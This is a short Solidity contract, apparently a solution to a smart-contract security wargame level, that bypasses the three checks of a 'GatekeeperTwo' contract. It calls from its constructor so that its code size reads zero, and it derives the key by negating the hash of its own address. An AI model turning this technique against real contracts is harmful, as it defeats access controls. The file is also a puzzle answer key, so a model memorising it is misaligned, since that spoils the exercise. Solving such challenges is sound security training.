// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface GatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}


contract GatebreakerTwo {

  // gateOne: call from contract
  // gateTwo: call from constructor to get codesize = 0
  // gateThree: learn what those operations do on a byte level
  constructor(address _gatekeeperContract) public {
    bytes8 gateKey = ~bytes8(keccak256(abi.encodePacked(address(this))));
    GatekeeperTwo(_gatekeeperContract).enter(gateKey);
  }
}
